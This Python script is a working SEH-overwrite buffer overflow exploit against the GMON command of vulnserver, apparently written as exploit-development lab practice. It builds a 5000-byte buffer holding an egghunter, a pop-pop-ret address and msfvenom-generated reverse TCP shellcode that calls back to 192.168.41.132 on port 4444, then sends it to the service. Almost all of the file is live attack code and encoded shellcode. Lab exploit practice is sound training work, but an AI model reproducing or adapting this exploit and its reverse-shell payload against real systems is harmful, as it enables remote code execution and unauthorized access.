#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, error, timeout
from sys import exit
from struct import pack

rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)
target_length = 5000


def validate_payload_length(current_length, expected_length):
    if current_length != expected_length:
        print(
            (
                "[!] Payload was length {current_length}. "
                "Expected: {expected_length}"
            ).format(current_length=current_length, expected_length=expected_length)
        )
        exit(1)


payload = ""
payload += "GMON "
payload += "/.:/"

# Message=    SEH record (nseh field) at 0x00b7ffdc overwritten with normal pattern : 0x45356d45 (offset 3495), followed by 28 bytes of cyclic data after the handler
nseh = "\x71\x80\x70\x80"
# Message=  0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0- (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll)
seh = pack("<L", 0x6250172b)
egghunter = (
    "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.41.132 LPORT=4444 -b '\x00' -a x86 --platform windows -f py -v revshell
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
revshell =  ""
revshell += "\xd9\xc7\xb8\xc9\x27\x12\xe7\xd9\x74\x24\xf4\x5a"
revshell += "\x29\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x8b"
revshell += "\x34\xf0\x12\xf7\xd3\x76\xdc\x07\x24\x17\x54\xe2"
revshell += "\x15\x17\x02\x67\x05\xa7\x40\x25\xaa\x4c\x04\xdd"
revshell += "\x39\x20\x81\xd2\x8a\x8f\xf7\xdd\x0b\xa3\xc4\x7c"
revshell += "\x88\xbe\x18\x5e\xb1\x70\x6d\x9f\xf6\x6d\x9c\xcd"
revshell += "\xaf\xfa\x33\xe1\xc4\xb7\x8f\x8a\x97\x56\x88\x6f"
revshell += "\x6f\x58\xb9\x3e\xfb\x03\x19\xc1\x28\x38\x10\xd9"
revshell += "\x2d\x05\xea\x52\x85\xf1\xed\xb2\xd7\xfa\x42\xfb"
revshell += "\xd7\x08\x9a\x3c\xdf\xf2\xe9\x34\x23\x8e\xe9\x83"
revshell += "\x59\x54\x7f\x17\xf9\x1f\x27\xf3\xfb\xcc\xbe\x70"
revshell += "\xf7\xb9\xb5\xde\x14\x3f\x19\x55\x20\xb4\x9c\xb9"
revshell += "\xa0\x8e\xba\x1d\xe8\x55\xa2\x04\x54\x3b\xdb\x56"
revshell += "\x37\xe4\x79\x1d\xda\xf1\xf3\x7c\xb3\x36\x3e\x7e"
revshell += "\x43\x51\x49\x0d\x71\xfe\xe1\x99\x39\x77\x2c\x5e"
revshell += "\x3d\xa2\x88\xf0\xc0\x4d\xe9\xd9\x06\x19\xb9\x71"
revshell += "\xae\x22\x52\x81\x4f\xf7\xf5\xd1\xff\xa8\xb5\x81"
revshell += "\xbf\x18\x5e\xcb\x4f\x46\x7e\xf4\x85\xef\x15\x0f"
revshell += "\x4e\xd0\x42\x26\x0a\xb8\x90\x38\x03\x65\x1c\xde"
revshell += "\x49\x85\x48\x49\xe6\x3c\xd1\x01\x97\xc1\xcf\x6c"
revshell += "\x97\x4a\xfc\x91\x56\xbb\x89\x81\x0f\x4b\xc4\xfb"
revshell += "\x86\x54\xf2\x93\x45\xc6\x99\x63\x03\xfb\x35\x34"
revshell += "\x44\xcd\x4f\xd0\x78\x74\xe6\xc6\x80\xe0\xc1\x42"
revshell += "\x5f\xd1\xcc\x4b\x12\x6d\xeb\x5b\xea\x6e\xb7\x0f"
revshell += "\xa2\x38\x61\xf9\x04\x93\xc3\x53\xdf\x48\x8a\x33"
revshell += "\xa6\xa2\x0d\x45\xa7\xee\xfb\xa9\x16\x47\xba\xd6"
revshell += "\x97\x0f\x4a\xaf\xc5\xaf\xb5\x7a\x4e\xdf\xff\x26"
revshell += "\xe7\x48\xa6\xb3\xb5\x14\x59\x6e\xf9\x20\xda\x9a"
revshell += "\x82\xd6\xc2\xef\x87\x93\x44\x1c\xfa\x8c\x20\x22"
revshell += "\xa9\xad\x60"

payload += "\x90" * 20
payload += "w00tw00t"
payload += revshell
payload += "\x90" * (3495 - 128 - 28 - len(revshell))
payload += "\x90" * 64
payload += egghunter
payload += "\x90" * (64 - len(egghunter))
payload += nseh
payload += seh
payload += "D" * (4989 - 8 - 3495)
payload += "\r\n"

if __name__ == "__main__":
    validate_payload_length(current_length=len(payload), expected_length=target_length)
    print("[*] Connecting to target")
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
    except timeout:
        print("[!] Timed out connecting to the service. Is it paused in the debugger?")
        exit(1)
    except error:
        print("[!] Failed to connect to remote service, is it running?")
        exit(1)
    print("[*] Checking for welcome message")
    try:
        welcome = s.recv(1024)
    except timeout:
        print(
            (
                "[!] Timed out waiting for the welcome message. "
                "Is it paused in the debugger?"
            )
        )
        exit(1)
    except error:
        print("[!] Failed to receive welcome message. Uh oh...")
        exit(1)
    print("[*] Welcome message received")
    print("\t" + welcome.rstrip())
    print("[*] Sending payload")
    s.send(payload)
    print("B00M! ph33r")
